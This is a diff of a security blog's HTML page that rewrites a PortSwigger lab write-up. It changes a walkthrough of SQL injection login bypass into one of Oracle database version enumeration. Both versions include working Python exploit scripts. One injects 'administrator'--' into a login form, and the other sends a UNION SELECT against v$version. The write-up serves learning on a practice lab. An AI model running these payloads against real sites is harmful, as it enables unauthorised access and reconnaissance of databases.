@@ -7,21 +7,21 @@
     <meta http-equiv="X-UA-Compatible" content="IE=edge" />
   
     <!-- Canonical & SEO -->
-    <title>SQL Injection Login Bypass | Shubham Ranpise</title>
-    <meta name="description" content="Learn how SQL injection can be used to bypass login authentication. Real-world example and practical explanation." />
-    <link rel="canonical" href="https://shubhamranpise.com/ctf/portswigger/sqli/sqli2.html" />
+    <title>SQL Injection – Oracle Version Enumeration | Shubham Ranpise</title>
+    <meta name="description" content="Learn how to use SQL injection to enumerate database type and version on Oracle servers." />
+    <link rel="canonical" href="https://shubhamranpise.com/ctf/portswigger/sqli/sqli3.html" />
   
     <!-- Open Graph -->
     <meta property="og:type" content="article" />
-    <meta property="og:title" content="SQL Injection Login Bypass | Shubham Ranpise" />
-    <meta property="og:description" content="Walkthrough of an SQL injection vulnerability that bypasses login mechanisms, with exploit steps and secure coding tips." />
-    <meta property="og:url" content="https://shubhamranpise.com/ctf/portswigger/sqli2.html" />
+    <meta property="og:title" content="SQLi Oracle Version Enumeration | Shubham Ranpise" />
+    <meta property="og:description" content="Step-by-step breakdown of using SQL injection to identify database type and version on Oracle targets." />
+    <meta property="og:url" content="https://shubhamranpise.com/ctf/portswigger/sqli3.html" />
     <meta property="og:image" content="https://shubhamranpise.com/assets/og-image.jpg" />
   
     <!-- Twitter Card -->
     <meta name="twitter:card" content="summary_large_image" />
-    <meta name="twitter:title" content="SQLi Login Bypass Writeup | Shubham Ranpise" />
-    <meta name="twitter:description" content="A practical SQL injection login bypass example explained." />
+    <meta name="twitter:title" content="SQLi Oracle Version Detection | Shubham Ranpise" />
+    <meta name="twitter:description" content="Walkthrough of a SQL injection attack that reveals the database version and type on Oracle backend systems." />
     <meta name="twitter:image" content="https://shubhamranpise.com/assets/og-image.jpg" />
   
     <!-- Favicon -->
@@ -51,18 +51,19 @@
     {
       "@context": "https://schema.org",
       "@type": "TechArticle",
-      "name": "SQL Injection Login Bypass",
+      "name": "SQL Injection on Oracle – Version Enumeration",
       "author": {
         "@type": "Person",
         "name": "Shubham Ranpise"
       },
-      "datePublished": "2025-04-23",
-      "description": "Step-by-step guide to exploiting a login bypass using SQL injection. Part of Shubham Ranpise's PortSwigger CTF series.",
-      "url": "https://shubhamranpise.com/ctf/portswigger/sqli2.html"
+      "datePublished": "2025-04-24",
+      "description": "This lab demonstrates an SQL injection attack targeting Oracle databases to enumerate the backend DBMS type and version.",
+      "url": "https://shubhamranpise.com/ctf/portswigger/sqli3.html"
     }
     </script>
-</head>
+  </head>
   
+
 <body>
     <header>
         <nav id="desktop-nav">
@@ -121,29 +122,30 @@
             <a href="./../../../index.html">Home</a>/
             <a href="./../../ctf.html">Ctf</a>/
             <a href="./../portswigger.html">Portswigger</a>/
-            <span>SQLi 2</span>
+            <span>SQLi 3</span>
         </p>
     </div>
     <br>
 
     <section id="ctf">
-        <h2 class="lab-heading">SQL injection vulnerability allowing login bypass</h2>
+        <h2 class="lab-heading">SQL injection attack, querying the database type and version on Oracle</h2>
         <div class="lab-section">
-            <h3 class="lab-date">🕗 23-April-2025</h3>
+            <h3 class="lab-date">🕗 24-April-2025</h3>
             <h3 class="lab-subheading">📚 What I Learned</h3>
-            <p>This lab showed how a basic SQL injection vulnerability in a login form can be used to bypass
-                authentication. By injecting a crafted input into the username field, I was able to manipulate the
-                backend SQL query and log in as the administrator user — without knowing the password. It was a powerful
-                reminder of how dangerous it is to construct SQL queries directly from user input.</p>
+            <p>This lab helped me understand how SQL injection can go beyond simple login bypass or data leakage. By
+                using a <i><b>UNION SELECT</b></i> injection, I was able to query internal database metadata — specifically from
+                Oracle's <i><b>v$version</b></i> view — to determine the database type and version. This kind of information is
+                crucial during real-world exploitation and recon, as it allows attackers to tailor further payloads to
+                the specific DBMS.</p>
 
             <h3 class="lab-subheading">⚙️ How Exploit Works</h3>
             <p>
                 [+] Start Burp Suite before running the script — it uses a proxy for visibility.<br>
-                [+] The login form input is vulnerable to SQL injection.<br>
-                [+] A crafted username like <b><i>administrator'--</i></b> bypasses password validation.<br>
-                [+] The server logs you in as <b><i>administrator</i></b> without needing the correct password.<br>
-                [+] CSRF token is fetched dynamically to submit a valid request.<br>
-                [+] Login success is confirmed when the error message is not shown.
+                [+] The input in the category parameter is injectable.<br>
+                [+] A <i><b>UNION SELECT</b></i> query is used to fetch database version details.<br>
+                [+] Oracle-specific view <i><b>v$version</b></i> reveals DB type and version.<br>
+                [+] The script checks for a success message in the response.<br>
+                [+] This confirms that the query executed and data was retrieved.
             </p>
 
             <h3 class="lab-subheading">🖥️ Command to Run</h3>
@@ -162,47 +164,33 @@
                 <pre><code>import requests
 import sys
 import urllib3
-from bs4 import BeautifulSoup
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
 
-def get_csrf_token(s, url):
-    uri = "/login"
-    r = s.get(url + uri , verify=False, proxies=proxies)
-    soup = BeautifulSoup(r.text, 'html.parser')
-    csrf = soup.find("input") ['value']
-    return csrf
-
-def exploit_sqli(s, url, payload):
-    csrf = get_csrf_token(s, url)
-    data = {"csrf": csrf,
-            "username": payload,
-            "password": payload}
-    uri = "/login"
-    r = s.post(url + uri, data=data, verify=False, proxies=proxies)
-    res = r.text
-    
-    if "Invalid username or password." in res:
-        return False
-    else:
+def exploit_sqli(url, payload):
+    uri = '/filter?category='
+    r = requests.get(url + uri + payload, verify=False, proxies=proxies)
+    if "Congratulations" in r.text:
         return True
-    
+    else:
+        return False
+
+
 if __name__ == "__main__":
     try:
         url = sys.argv[1].strip()
-        sqli_payload = "administrator'--"
+        payload = "'UNION+SELECT+BANNER,BANNER+FROM+v$version--"
     except IndexError:
         print("[-] Usage: %s &lt;url&gt;" %sys.argv[0])
-        print('[-] Example: %s www.example.com' %sys.argv[0])
+        print('[-] Example: %s www.example.com ' % sys.argv[0])
+        sys.exit(-1)
         
-    s = requests.Session()
-    
-    if exploit_sqli(s, url, sqli_payload):
-        print("[+] SQL injection successful! We have logged in as the administrator user.")
+    if exploit_sqli(url, payload):
+        print("[+] SQL injection successful!")
     else:
-        print("[-] SQL injection unsuccessful.")
+        print("[-] SQL injection unsuccessful")        
                 </code></pre>
                 <div class="floating-code-buttons">
                     <button class="copy-btn">📋</button>
